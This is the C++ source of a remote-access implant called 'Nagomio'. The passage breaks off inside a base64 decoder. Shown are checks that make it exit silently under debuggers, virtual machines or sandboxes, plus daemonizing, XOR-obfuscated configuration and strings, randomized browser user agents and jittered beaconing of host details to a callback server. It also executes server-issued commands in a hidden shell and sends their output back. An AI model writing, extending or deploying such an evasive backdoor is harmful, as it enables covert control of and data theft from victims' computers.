#include <array>
#include <algorithm>
#include <chrono>
#include <cctype>
#include <ctime>
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <iterator>
#include <memory>
#include <random>
#include <sstream>
#include <stdexcept>
#include <string>
#include <thread>
#include <vector>
#include <cwctype>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#else
#include <cerrno>
#include <cpuid.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>
#endif

#include "build_config.h"
#include "httplib.h"
#include "json.hpp"
#include "protocol.h"

#if (NAGOMIO_STEALTH || NAGOMIO_ANTI_DEBUG || NAGOMIO_DAEMONIZE || NAGOMIO_ANTI_VM || NAGOMIO_ANTI_SANDBOX) && !defined(_WIN32)
#include <sys/sysinfo.h>

#if NAGOMIO_STEALTH || NAGOMIO_ANTI_DEBUG
void perform_anti_debug_checks() {
    std::ifstream status_file("/proc/self/status");
    std::string line;
    while (std::getline(status_file, line)) {
        if (line.rfind("TracerPid:", 0) == 0) {
            int tracer_pid = 0;
            if (sscanf(line.c_str(), "TracerPid:\t%d", &tracer_pid) == 1 && tracer_pid != 0) {
                exit(0); // Exit silently if being debugged
            }
        }
    }
}
#endif

#if NAGOMIO_STEALTH || NAGOMIO_DAEMONIZE
void detach_from_terminal() {
    if (daemon(1, 0) == -1) {
        exit(0); // Exit if daemonization fails
    }
}
#endif
#elif (NAGOMIO_STEALTH || NAGOMIO_ANTI_DEBUG) && defined(_WIN32)
void perform_anti_debug_checks() {
    if (IsDebuggerPresent()) {
        exit(0);
    }
}
#endif
#if NAGOMIO_STEALTH || NAGOMIO_ANTI_VM
std::string lowercase(std::string value) {
    std::transform(value.begin(), value.end(), value.begin(), [](unsigned char ch) {
        return static_cast<char>(std::tolower(ch));
    });
    return value;
}

#ifdef _WIN32
std::wstring lowercase_wide(std::wstring value) {
    std::transform(value.begin(), value.end(), value.begin(), [](wchar_t ch) {
        return static_cast<wchar_t>(std::towlower(ch));
    });
    return value;
}

bool has_vm_process_windows() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    if (!Process32FirstW(snapshot, &entry)) {
        CloseHandle(snapshot);
        return false;
    }

    do {
        std::wstring name = lowercase_wide(entry.szExeFile);
        if (name.find(L"vmtoolsd") != std::wstring::npos ||
            name.find(L"vboxservice") != std::wstring::npos ||
            name.find(L"vboxtray") != std::wstring::npos ||
            name.find(L"xenservice") != std::wstring::npos) {
            CloseHandle(snapshot);
            return true;
        }
    } while (Process32NextW(snapshot, &entry));

    CloseHandle(snapshot);
    return false;
}

bool has_vm_mac_windows() {
    ULONG buf_len = 0;
    if (GetAdaptersInfo(nullptr, &buf_len) != ERROR_BUFFER_OVERFLOW || buf_len == 0) {
        return false;
    }

    std::vector<unsigned char> buffer(buf_len);
    auto adapter_info = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapter_info, &buf_len) != ERROR_SUCCESS) {
        return false;
    }

    for (PIP_ADAPTER_INFO adapter = adapter_info; adapter; adapter = adapter->Next) {
        if (adapter->AddressLength < 3) {
            continue;
        }
        if ((adapter->Address[0] == 0x00 && adapter->Address[1] == 0x0C && adapter->Address[2] == 0x29) ||
            (adapter->Address[0] == 0x00 && adapter->Address[1] == 0x50 && adapter->Address[2] == 0x56) ||
            (adapter->Address[0] == 0x08 && adapter->Address[1] == 0x00 && adapter->Address[2] == 0x27) ||
            (adapter->Address[0] == 0x00 && adapter->Address[1] == 0x15 && adapter->Address[2] == 0x5D)) {
            return true;
        }
    }
    return false;
}
#else
bool has_vm_process_linux() {
    const std::array<std::string, 4> vm_processes = {"vmtoolsd", "vboxservice", "vboxclient", "xenservice"};
    std::error_code ec;
    for (const auto& entry : std::filesystem::directory_iterator("/proc", ec)) {
        if (ec || !entry.is_directory()) {
            continue;
        }
        std::string pid = entry.path().filename().string();
        if (!std::all_of(pid.begin(), pid.end(), [](unsigned char ch) { return std::isdigit(ch); })) {
            continue;
        }
        std::ifstream comm(entry.path() / "comm");
        std::string name;
        if (!std::getline(comm, name)) {
            continue;
        }
        name = lowercase(name);
        if (std::find(vm_processes.begin(), vm_processes.end(), name) != vm_processes.end()) {
            return true;
        }
    }
    return false;
}

bool has_vm_mac_linux() {
    const std::array<std::string, 4> vm_ouis = {"00:0c:29", "00:50:56", "08:00:27", "00:15:5d"};
    std::error_code ec;
    for (const auto& entry : std::filesystem::directory_iterator("/sys/class/net", ec)) {
        if (ec) {
            break;
        }
        std::ifstream address(entry.path() / "address");
        std::string mac;
        if (!std::getline(address, mac) || mac.size() < 8) {
            continue;
        }
        std::string oui = lowercase(mac.substr(0, 8));
        if (std::find(vm_ouis.begin(), vm_ouis.end(), oui) != vm_ouis.end()) {
            return true;
        }
    }
    return false;
}
#endif

void perform_anti_vm_checks() {
    int indicators = 0;
#ifdef _WIN32
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        indicators += 1;
    }
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
        indicators += 1;
    }

    int cpu_info[4] = {};
    __cpuid(cpu_info, 1);
    if (cpu_info[2] & (1 << 31)) {
        indicators += 1;
    }

    if (has_vm_process_windows()) {
        indicators += 1;
    }
    if (has_vm_mac_windows()) {
        indicators += 1;
    }
#else
    long num_procs = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_procs < 2) {
        indicators += 1;
    }
    long pages = sysconf(_SC_PHYS_PAGES);
    long page_size = sysconf(_SC_PAGE_SIZE);
    if (pages * page_size < (2LL * 1024 * 1024 * 1024)) {
        indicators += 1;
    }

    unsigned int eax, ebx, ecx, edx;
    if (__get_cpuid(1, &eax, &ebx, &ecx, &edx)) {
        if (ecx & (1U << 31)) {
            indicators += 1;
        }
    }

    if (has_vm_process_linux()) {
        indicators += 1;
    }
    if (has_vm_mac_linux()) {
        indicators += 1;
    }
#endif

    if (indicators >= 3) {
        exit(0);
    }
}
#endif

#if NAGOMIO_STEALTH || NAGOMIO_ANTI_SANDBOX
void perform_anti_sandbox_checks() {
#ifdef _WIN32
    ULONGLONG uptime = GetTickCount64();
    if (uptime < 120000) {
        exit(0);
    }
#else
    struct sysinfo info;
    sysinfo(&info);
    if (info.uptime < 120) {
        exit(0);
    }
#endif
}
#endif
#if (NAGOMIO_STEALTH || NAGOMIO_DAEMONIZE) && defined(_WIN32)
void detach_from_terminal() {
    FreeConsole();
}
#endif

using json = nlohmann::json;

#if NAGOMIO_XOR_CONFIG
template <size_t N>
constexpr std::array<char, N> obfuscate(const char (&s)[N]) {
    std::array<char, N> result{};
    for (size_t i = 0; i < N; ++i) {
        result[i] = s[i] ^ static_cast<char>(NAGOMIO_XOR_KEY);
    }
    return result;
}

inline std::string xor_decode_literal(const char* data, size_t len) {
    std::string r;
    r.reserve(len);
    for (size_t i = 0; i < len; ++i) {
        r.push_back(data[i] ^ static_cast<char>(NAGOMIO_XOR_KEY));
    }
    return r;
}

#define OBFDATA(s) []{ constexpr auto _d = obfuscate(s); return _d; }()
#define OBFSTR(s) xor_decode_literal(OBFDATA(s).data(), sizeof(s) - 1)
#else
#define OBFSTR(s) std::string(s)
#endif

const size_t MAX_COMMAND_OUTPUT_BYTES = 1024 * 1024;
const std::uintmax_t MAX_FILE_TRANSFER_BYTES = 10ULL * 1024ULL * 1024ULL;
const int DEFAULT_TASK_TIMEOUT_SECONDS = 120;

std::string decode_xor_config(const unsigned char* data, size_t len) {
    std::string decoded;
    decoded.reserve(len);
    for (size_t index = 0; index < len; ++index) {
        decoded.push_back(static_cast<char>(data[index] ^ static_cast<unsigned char>(NAGOMIO_XOR_KEY)));
    }
    return decoded;
}

std::string default_callback_url() {
#if NAGOMIO_XOR_CONFIG
    return decode_xor_config(NAGOMIO_CALLBACK_URL_XOR, NAGOMIO_CALLBACK_URL_XOR_LEN);
#else
    return NAGOMIO_DEFAULT_CALLBACK_URL;
#endif
}

std::string default_agent_id_config() {
#if NAGOMIO_XOR_CONFIG
    return decode_xor_config(NAGOMIO_AGENT_ID_XOR, NAGOMIO_AGENT_ID_XOR_LEN);
#else
    return NAGOMIO_DEFAULT_AGENT_ID;
#endif
}

std::string default_agent_token_config() {
#if NAGOMIO_XOR_CONFIG
    return decode_xor_config(NAGOMIO_AGENT_TOKEN_XOR, NAGOMIO_AGENT_TOKEN_XOR_LEN);
#else
    return NAGOMIO_DEFAULT_AGENT_TOKEN;
#endif
}

namespace Nagomio {
    void to_json(json& j, const AgentRegistration& p) {
        j = json{{"agent_id", p.agent_id}, {"hostname", p.hostname}, {"os", p.os}, {"architecture", p.architecture}};
    }

    void to_json(json& j, const BeaconRequest& p) {
        j = json{{"registration", p.registration}};
    }

    void from_json(const json& j, Task& p) {
        j.at("task_id").get_to(p.task_id);
        j.at("command").get_to(p.command);
        j.at("arguments").get_to(p.arguments);
    }

    void from_json(const json& j, BeaconReply& p) {
        j.at("status").get_to(p.status);
        j.at("sleep_seconds").get_to(p.sleep_seconds);
        p.has_task = j.contains("task") && !j.at("task").is_null();
        if (p.has_task) {
            p.task = j.at("task").get<Task>();
        }
    }

    void to_json(json& j, const AgentResponse& p) {
        j = json{{"agent_id", p.agent_id}, {"output", p.output}, {"status", p.status}};
        if (!p.task_id.empty()) {
            j["task_id"] = p.task_id;
        } else {
            j["task_id"] = nullptr;
        }
    }
}

#if NAGOMIO_UA_RANDOMIZE
static constexpr const char* UA_POOL[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
};

static std::string random_user_agent() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<size_t> dist(0, std::size(UA_POOL) - 1);
    return UA_POOL[dist(gen)];
}
#endif

struct AgentConfig {
    std::string callback_url = default_callback_url();
    std::string agent_id = default_agent_id_config();
    std::string agent_token = default_agent_token_config();
    int sleep_seconds = NAGOMIO_DEFAULT_SLEEP_SECONDS;
    int jitter_percent = NAGOMIO_DEFAULT_JITTER_PERCENT;
    int task_timeout_seconds = DEFAULT_TASK_TIMEOUT_SECONDS;
#if NAGOMIO_UA_RANDOMIZE
    std::string user_agent = random_user_agent();
#else
    std::string user_agent = "NagomioAgent/1.0";
#endif
};

std::string env_or_default(const char* key, const std::string& default_value) {
    const char* value = std::getenv(key);
    return value && value[0] != '\0' ? std::string(value) : default_value;
}

int env_int_or_default(const char* key, int default_value) {
    const char* value = std::getenv(key);
    if (!value || value[0] == '\0') {
        return default_value;
    }

    try {
        int parsed = std::stoi(value);
        return parsed > 0 ? parsed : default_value;
    } catch (...) {
        return default_value;
    }
}

AgentConfig parse_config(int argc, char** argv) {
    AgentConfig config;
    config.callback_url = env_or_default("NAGOMIO_CALLBACK_URL", config.callback_url);
    config.agent_id = env_or_default("NAGOMIO_AGENT_ID", config.agent_id);
    config.agent_token = env_or_default("NAGOMIO_AGENT_TOKEN", config.agent_token);
    config.sleep_seconds = env_int_or_default("NAGOMIO_SLEEP_SECONDS", config.sleep_seconds);
    config.jitter_percent = env_int_or_default("NAGOMIO_JITTER_PERCENT", config.jitter_percent);
    config.task_timeout_seconds = env_int_or_default("NAGOMIO_TASK_TIMEOUT_SECONDS", config.task_timeout_seconds);

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--url" && i + 1 < argc) {
            config.callback_url = argv[++i];
        } else if (arg == "--agent-id" && i + 1 < argc) {
            config.agent_id = argv[++i];
        } else if (arg == "--agent-token" && i + 1 < argc) {
            config.agent_token = argv[++i];
        } else if (arg == "--sleep" && i + 1 < argc) {
            try {
                int parsed = std::stoi(argv[++i]);
                if (parsed > 0) {
                    config.sleep_seconds = parsed;
                }
            } catch (...) {
                std::cerr << "[-] Ignoring invalid --sleep value." << std::endl;
            }
        } else if (arg == "--jitter" && i + 1 < argc) {
            try {
                int parsed = std::stoi(argv[++i]);
                if (parsed >= 0 && parsed <= 90) {
                    config.jitter_percent = parsed;
                }
            } catch (...) {
                std::cerr << "[-] Ignoring invalid --jitter value." << std::endl;
            }
        } else if (arg == "--task-timeout" && i + 1 < argc) {
            try {
                int parsed = std::stoi(argv[++i]);
                if (parsed > 0) {
                    config.task_timeout_seconds = parsed;
                }
            } catch (...) {
                std::cerr << "[-] Ignoring invalid --task-timeout value." << std::endl;
            }
        }
    }

    return config;
}

int next_sleep_seconds(const AgentConfig& config) {
    if (config.jitter_percent <= 0) {
        return config.sleep_seconds;
    }

    int spread = std::max(1, (config.sleep_seconds * config.jitter_percent) / 100);
    static std::random_device rd;
    static std::mt19937 generator(rd());
    std::uniform_int_distribution<int> distribution(-spread, spread);
    return std::max(1, config.sleep_seconds + distribution(generator));
}

#if NAGOMIO_SLEEP_OBFUSCATE
void obfuscated_sleep(int total_seconds) {
    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(total_seconds);
    static std::random_device rd;
    static std::mt19937 gen(rd());
    volatile unsigned long accumulator = 0;
    while (std::chrono::steady_clock::now() < deadline) {
        std::uniform_int_distribution<int> slice_dist(20, 140);
        int slice_ms = slice_dist(gen);
        std::this_thread::sleep_for(std::chrono::milliseconds(slice_ms));
        for (int i = 0; i < 500; ++i) {
            accumulator = accumulator * 1103515245 + 12345;
        }
    }
}
#endif

struct HttpPostResult {
    bool transport_ok = false;
    int status = 0;
    std::string body;
    std::string error;
    std::string location;
};

#ifdef _WIN32
std::wstring utf8_to_wide(const std::string& value) {
    if (value.empty()) {
        return L"";
    }

    int length = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0);
    if (length <= 0) {
        return L"";
    }

    std::wstring wide(static_cast<size_t>(length), L'\0');
    MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), wide.data(), length);
    return wide;
}

std::string wide_to_utf8(const std::wstring& value) {
    if (value.empty()) {
        return "";
    }

    int length = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0, nullptr, nullptr);
    if (length <= 0) {
        return "";
    }

    std::string utf8(static_cast<size_t>(length), '\0');
    WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), utf8.data(), length, nullptr, nullptr);
    return utf8;
}

struct WinHttpHandle {
    HINTERNET handle = nullptr;

    explicit WinHttpHandle(HINTERNET value = nullptr) : handle(value) {}
    ~WinHttpHandle() {
        if (handle) {
            WinHttpCloseHandle(handle);
        }
    }

    WinHttpHandle(const WinHttpHandle&) = delete;
    WinHttpHandle& operator=(const WinHttpHandle&) = delete;

    operator HINTERNET() const {
        return handle;
    }
};

std::string windows_error(const std::string& action) {
    std::stringstream message;
    message << action << " failed with Win32 error " << GetLastError();
    return message.str();
}

std::wstring combine_url_path(const URL_COMPONENTS& components, const std::string& endpoint) {
    std::wstring base_path;
    if (components.lpszUrlPath && components.dwUrlPathLength > 0) {
        base_path.assign(components.lpszUrlPath, components.dwUrlPathLength);
    }

    std::wstring endpoint_path = utf8_to_wide(endpoint);
    if (base_path.empty() || base_path == L"/") {
        return endpoint_path.empty() || endpoint_path.front() == L'/' ? endpoint_path : L"/" + endpoint_path;
    }

    while (!base_path.empty() && base_path.back() == L'/') {
        base_path.pop_back();
    }
    if (!endpoint_path.empty() && endpoint_path.front() != L'/') {
        endpoint_path.insert(endpoint_path.begin(), L'/');
    }
    return base_path + endpoint_path;
}

HttpPostResult post_json_windows(const AgentConfig& config, const std::string& endpoint, const std::string& body) {
    HttpPostResult result;
    std::wstring callback_url = utf8_to_wide(config.callback_url);

    URL_COMPONENTS components{};
    components.dwStructSize = sizeof(components);
    components.dwSchemeLength = static_cast<DWORD>(-1);
    components.dwHostNameLength = static_cast<DWORD>(-1);
    components.dwUrlPathLength = static_cast<DWORD>(-1);
    components.dwExtraInfoLength = static_cast<DWORD>(-1);
    if (!WinHttpCrackUrl(callback_url.c_str(), static_cast<DWORD>(callback_url.size()), 0, &components)) {
        result.error = windows_error("WinHttpCrackUrl");
        return result;
    }

    std::wstring host(components.lpszHostName, components.dwHostNameLength);
    std::wstring path = combine_url_path(components, endpoint);
    bool secure = components.nScheme == INTERNET_SCHEME_HTTPS;

    WinHttpHandle session(WinHttpOpen(utf8_to_wide(config.user_agent).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
    if (!session) {
        result.error = windows_error("WinHttpOpen");
        return result;
    }

    WinHttpHandle connection(WinHttpConnect(session, host.c_str(), components.nPort, 0));
    if (!connection) {
        result.error = windows_error("WinHttpConnect");
        return result;
    }

    DWORD flags = secure ? WINHTTP_FLAG_SECURE : 0;
    WinHttpHandle request(WinHttpOpenRequest(connection, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags));
    if (!request) {
        result.error = windows_error("WinHttpOpenRequest");
        return result;
    }

    DWORD redirect_policy = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
    WinHttpSetOption(request, WINHTTP_OPTION_REDIRECT_POLICY, &redirect_policy, sizeof(redirect_policy));

    std::wstring headers = L"Content-Type: application/json\r\n";
    if (!config.agent_token.empty()) {
        headers += L"x-nagomio-agent-token: ";
        headers += utf8_to_wide(config.agent_token);
        headers += L"\r\n";
    }

    if (!WinHttpSendRequest(
            request,
            headers.c_str(),
            static_cast<DWORD>(headers.size()),
            const_cast<char*>(body.data()),
            static_cast<DWORD>(body.size()),
            static_cast<DWORD>(body.size()),
            0)) {
        result.error = windows_error("WinHttpSendRequest");
        return result;
    }

    if (!WinHttpReceiveResponse(request, nullptr)) {
        result.error = windows_error("WinHttpReceiveResponse");
        return result;
    }

    DWORD status_code = 0;
    DWORD status_size = sizeof(status_code);
    if (WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &status_code, &status_size, WINHTTP_NO_HEADER_INDEX)) {
        result.status = static_cast<int>(status_code);
    }

    DWORD location_size = 0;
    WinHttpQueryHeaders(request, WINHTTP_QUERY_LOCATION, WINHTTP_HEADER_NAME_BY_INDEX, nullptr, &location_size, WINHTTP_NO_HEADER_INDEX);
    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER && location_size > 0) {
        std::wstring location(static_cast<size_t>(location_size / sizeof(wchar_t)), L'\0');
        if (WinHttpQueryHeaders(request, WINHTTP_QUERY_LOCATION, WINHTTP_HEADER_NAME_BY_INDEX, location.data(), &location_size, WINHTTP_NO_HEADER_INDEX)) {
            auto terminator = location.find(L'\0');
            if (terminator != std::wstring::npos) {
                location.resize(terminator);
            }
            result.location = wide_to_utf8(location);
        }
    }

    while (true) {
        DWORD available = 0;
        if (!WinHttpQueryDataAvailable(request, &available)) {
            result.error = windows_error("WinHttpQueryDataAvailable");
            return result;
        }
        if (available == 0) {
            break;
        }

        std::string chunk(static_cast<size_t>(available), '\0');
        DWORD read = 0;
        if (!WinHttpReadData(request, chunk.data(), available, &read)) {
            result.error = windows_error("WinHttpReadData");
            return result;
        }
        chunk.resize(read);
        result.body += chunk;
    }

    result.transport_ok = true;
    return result;
}
#else
HttpPostResult post_json(httplib::Client& cli, const httplib::Headers& headers, const std::string& endpoint, const std::string& body) {
    HttpPostResult result;
    if (auto res = cli.Post(endpoint, headers, body, "application/json")) {
        result.transport_ok = true;
        result.status = res->status;
        result.body = res->body;
        result.location = res->get_header_value("Location");
    } else {
        result.error = httplib::to_string(res.error());
    }
    return result;
}
#endif

std::string get_hostname() {
#ifdef _WIN32
    std::array<char, 256> hostname{};
    DWORD size = static_cast<DWORD>(hostname.size());
    if (GetComputerNameA(hostname.data(), &size) != 0) {
        return hostname.data();
    }
#else
    std::array<char, 256> hostname{};
    if (gethostname(hostname.data(), hostname.size() - 1) == 0) {
        return hostname.data();
    }
#endif
    return "unknown-host";
}

std::string get_os_name() {
#ifdef _WIN32
    return "Windows";
#else
    struct utsname info {};
    if (uname(&info) == 0) {
        return info.sysname;
    }
    return "unknown-os";
#endif
}

std::string get_architecture() {
#ifdef _WIN32
#if defined(_M_X64) || defined(__x86_64__) || defined(__amd64__)
    return "x86_64";
#elif defined(_M_IX86) || defined(__i386__)
    return "x86";
#elif defined(_M_ARM64) || defined(__aarch64__)
    return "aarch64";
#elif defined(_M_ARM) || defined(__arm__)
    return "arm";
#else
    return "unknown-arch";
#endif
#else
    struct utsname info {};
    if (uname(&info) == 0) {
        return info.machine;
    }
    return "unknown-arch";
#endif
}

std::string default_agent_id() {
    std::stringstream id;
#ifdef _WIN32
    id << get_hostname() << "-" << GetCurrentProcessId();
#else
    id << get_hostname() << "-" << getpid();
#endif
    return id.str();
}

void append_capped(std::string& output, const char* data, size_t length, bool& truncated) {
    if (output.size() >= MAX_COMMAND_OUTPUT_BYTES) {
        truncated = true;
        return;
    }

    size_t available = MAX_COMMAND_OUTPUT_BYTES - output.size();
    size_t to_copy = std::min(length, available);
    output.append(data, to_copy);
    if (to_copy < length) {
        truncated = true;
    }
}

void append_truncation_notice(std::string& output, bool truncated) {
    if (truncated) {
        output += "\n[output truncated]";
    }
}

struct CommandExecutionResult {
    std::string output;
    bool timed_out = false;
};

#ifdef _WIN32
CommandExecutionResult exec_hidden_windows(const char* cmd, int timeout_seconds) {
    SECURITY_ATTRIBUTES security_attributes{};
    security_attributes.nLength = sizeof(SECURITY_ATTRIBUTES);
    security_attributes.bInheritHandle = TRUE;

    HANDLE read_pipe = nullptr;
    HANDLE write_pipe = nullptr;
    if (!CreatePipe(&read_pipe, &write_pipe, &security_attributes, 0)) {
        throw std::runtime_error("CreatePipe failed");
    }
    SetHandleInformation(read_pipe, HANDLE_FLAG_INHERIT, 0);

    std::string command_line = std::string(OBFSTR("cmd.exe /C ")) + cmd;
    STARTUPINFOA startup_info{};
    startup_info.cb = sizeof(STARTUPINFOA);
    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;
    startup_info.hStdOutput = write_pipe;
    startup_info.hStdError = write_pipe;
    startup_info.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION process_info{};
    BOOL created = CreateProcessA(
        nullptr,
        command_line.data(),
        nullptr,
        nullptr,
        TRUE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &startup_info,
        &process_info
    );
    CloseHandle(write_pipe);

    if (!created) {
        CloseHandle(read_pipe);
        throw std::runtime_error("CreateProcess failed");
    }

    std::string result;
    std::array<char, 4096> buffer{};
    bool truncated = false;
    bool timed_out = false;
    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(timeout_seconds);

    while (true) {
        DWORD available = 0;
        if (PeekNamedPipe(read_pipe, nullptr, 0, nullptr, &available, nullptr) && available > 0) {
            DWORD bytes_to_read = std::min<DWORD>(available, static_cast<DWORD>(buffer.size()));
            DWORD bytes_read = 0;
            if (ReadFile(read_pipe, buffer.data(), bytes_to_read, &bytes_read, nullptr) && bytes_read > 0) {
                append_capped(result, buffer.data(), bytes_read, truncated);
            }
        }

        DWORD wait_status = WaitForSingleObject(process_info.hProcess, 50);
        if (wait_status == WAIT_OBJECT_0) {
            break;
        }

        if (std::chrono::steady_clock::now() >= deadline) {
            timed_out = true;
            TerminateProcess(process_info.hProcess, 124);
            WaitForSingleObject(process_info.hProcess, 1000);
            break;
        }
    }

    while (true) {
        DWORD available = 0;
        if (!PeekNamedPipe(read_pipe, nullptr, 0, nullptr, &available, nullptr) || available == 0) {
            break;
        }
        DWORD bytes_to_read = std::min<DWORD>(available, static_cast<DWORD>(buffer.size()));
        DWORD bytes_read = 0;
        if (!ReadFile(read_pipe, buffer.data(), bytes_to_read, &bytes_read, nullptr) || bytes_read == 0) {
            break;
        }
        append_capped(result, buffer.data(), bytes_read, truncated);
    }

    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);
    CloseHandle(read_pipe);
    if (timed_out) {
        result += "\n[task timed out]";
    }
    append_truncation_notice(result, truncated);
    return {result, timed_out};
}
#else
CommandExecutionResult exec_shell_linux(const char* cmd, int timeout_seconds) {
    int pipe_fds[2];
    if (pipe(pipe_fds) == -1) {
        throw std::runtime_error("pipe failed");
    }

    pid_t pid = fork();
    if (pid == -1) {
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        throw std::runtime_error("fork failed");
    }

    if (pid == 0) {
        setpgid(0, 0);
        close(pipe_fds[0]);
        dup2(pipe_fds[1], STDOUT_FILENO);
        dup2(pipe_fds[1], STDERR_FILENO);
        close(pipe_fds[1]);
        execl(OBFSTR("/bin/sh").c_str(), OBFSTR("sh").c_str(), OBFSTR("-c").c_str(), cmd, static_cast<char*>(nullptr));
        _exit(127);
    }

    close(pipe_fds[1]);
    int flags = fcntl(pipe_fds[0], F_GETFL, 0);
    if (flags != -1) {
        fcntl(pipe_fds[0], F_SETFL, flags | O_NONBLOCK);
    }

    std::string result;
    std::array<char, 4096> buffer{};
    bool truncated = false;
    bool timed_out = false;
    bool child_done = false;
    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(timeout_seconds);

    while (true) {
        ssize_t bytes_read = read(pipe_fds[0], buffer.data(), buffer.size());
        if (bytes_read > 0) {
            append_capped(result, buffer.data(), static_cast<size_t>(bytes_read), truncated);
        }

        int status = 0;
        pid_t wait_result = waitpid(pid, &status, WNOHANG);
        if (wait_result == pid) {
            child_done = true;
        }

        if (child_done && bytes_read == 0) {
            break;
        }

        if (std::chrono::steady_clock::now() >= deadline) {
            timed_out = true;
            kill(-pid, SIGKILL);
            waitpid(pid, nullptr, 0);
            break;
        }

        if (bytes_read == -1 && errno != EAGAIN && errno != EWOULDBLOCK) {
            break;
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(25));
    }

    while (true) {
        ssize_t bytes_read = read(pipe_fds[0], buffer.data(), buffer.size());
        if (bytes_read <= 0) {
            break;
        }
        append_capped(result, buffer.data(), static_cast<size_t>(bytes_read), truncated);
    }

    close(pipe_fds[0]);
    if (timed_out) {
        result += "\n[task timed out]";
    }
    append_truncation_notice(result, truncated);
    return {result, timed_out};
}
#endif

CommandExecutionResult exec(const char* cmd, int timeout_seconds) {
#ifdef _WIN32
    return exec_hidden_windows(cmd, timeout_seconds);
#else
    return exec_shell_linux(cmd, timeout_seconds);
#endif
}

std::string shell_quote(const std::string& value) {
#ifdef _WIN32
    std::string quoted = "\"";
    for (char ch : value) {
        if (ch == '"' || ch == '\\') {
            quoted += '\\';
        }
        quoted += ch;
    }
    quoted += "\"";
    return quoted;
#else
    std::string quoted = "'";
    for (char ch : value) {
        if (ch == '\'') {
            quoted += "'\\''";
        } else {
            quoted += ch;
        }
    }
    quoted += "'";
    return quoted;
#endif
}

std::string build_command_line(const Nagomio::Task& task) {
    std::string command = task.command;
    for (const auto& argument : task.arguments) {
        command += " ";
        command += shell_quote(argument);
    }
    return command;
}

const std::string BASE64_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string base64_encode(const std::vector<unsigned char>& data) {
    std::string encoded;
    int value = 0;
    int bits = -6;
    for (unsigned char byte : data) {
        value = (value << 8) + byte;
        bits += 8;
        while (bits >= 0) {
            encoded.push_back(BASE64_ALPHABET[(value >> bits) & 0x3F]);
            bits -= 6;
        }
    }
    if (bits > -6) {
        encoded.push_back(BASE64_ALPHABET[((value << 8) >> (bits + 8)) & 0x3F]);
    }
    while (encoded.size() % 4) {
        encoded.push_back('=');
    }
    return encoded;
}

std::vector<unsigned char> base64_decode(const std::string& input) {
    std::array<int, 256> lookup{};
    lookup.fill(-1);
    for (int i = 0; i < static_cast<int>(BASE64_ALPHABET.size()); ++i) {
        lookup[static_cast<unsigned char>(BASE64_ALPHABET[i])] = i;
    }

    std::vector<unsigned char> decoded;
    int value = 0;
    int bits = -8;
    for (unsigned char ch : input) {
        if (ch == '=') {
            break;
        }
        if (std::isspace(ch)) {
            continue;
        }
        if (lookup[ch] == -1) {
            throw std::runtime_error("invalid base64 content");
        }
        value = (value << 6) + lookup[ch];
        bits += 6;
        if (bits >= 0) {
